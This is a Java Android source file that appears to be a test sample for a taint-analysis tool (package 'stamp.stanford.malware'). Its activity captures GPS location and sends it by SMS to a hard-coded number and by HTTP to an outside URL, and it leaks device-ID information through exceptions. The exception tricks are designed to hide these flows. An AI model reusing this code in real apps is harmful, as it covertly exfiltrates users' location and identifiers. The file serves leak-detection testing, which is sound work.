package stamp.stanford.malware;

import android.app.Activity;
import android.app.PendingIntent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import java.io.IOException;
import java.net.MalformedURLException;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

public class Malware extends Activity {
    public static class MyException extends Exception {
	public final String payload;
	public MyException(String payload) { this.payload = payload; }
    }

    public static void explicitExceptionLeak(String secret) throws MyException {
	throw new MyException(secret);
    }

    public static void implicitExceptionLeak(String secret) {
	Integer.parseInt(secret);
    }

    private class LeakInfo extends AsyncTask<String, Void, Void>{

	@Override 
	    protected Void doInBackground(String... params) {
	    
	    String phoneNumber = "9995556677";
	    String msg = params[0];

	    if(phoneNumber.length()>0 && msg.length()>0) {
		SmsManager sms = SmsManager.getDefault();
		sms.sendMultipartTextMessage(phoneNumber, null, sms.divideMessage(msg), null, null);
	    }
	    
	    try {
		HttpClient client = new DefaultHttpClient();
		String getURL = "http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=".concat(msg);
		HttpGet get = new HttpGet(getURL);
		HttpResponse responseGet = client.execute(get);
		HttpEntity resEntityGet = responseGet.getEntity();
		// if (resEntityGet != null) {
		//     Log.i("GET RESPONSE",EntityUtils.toString(resEntityGet));
		// }
	    } catch (MalformedURLException e) {
		e.printStackTrace();
	    } catch (IOException e) {
		e.printStackTrace();
	    }
	    return null;
	}

    }
    
    private class MyLocationListener implements LocationListener {
	public void onLocationChanged(Location loc) {
	    try {
		explicitExceptionLeak(loc.toString());
	    } catch(MyException e) {
		new LeakInfo().execute(e.payload);
	    }
	}
	
	@Override
	    public void onProviderDisabled(String provider) {
	}
	
	@Override
	    public void onProviderEnabled(String provider) {
	}
	
	@Override
	    public void onStatusChanged(String provider, int status, Bundle extras) {
	}
    }

    // Calling implicitExceptionLeak throws an exception, which leaks one bit about deviceId
    public static void leakDeviceId(TelephonyManager tm) {
	// Leak Deviceid to both SMS and web
	String deviceId = tm.getDeviceId();
	implicitExceptionLeak(deviceId);
    }

    
    /** Called when the activity is first created. */
    @Override
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
	
	// Leak Location to both SMS and web
	LocationManager mlocManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
	LocationListener mlocListener = new MyLocationListener();
	mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, mlocListener);
	
	try {
	    TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
	    leakDeviceId(tm);
	} catch(Exception e) {
	    String s = "";
	    new LeakInfo().execute(s);
	}	
    }
    
    @Override
	public void onStart(){
	super.onStart();
    }
    
}
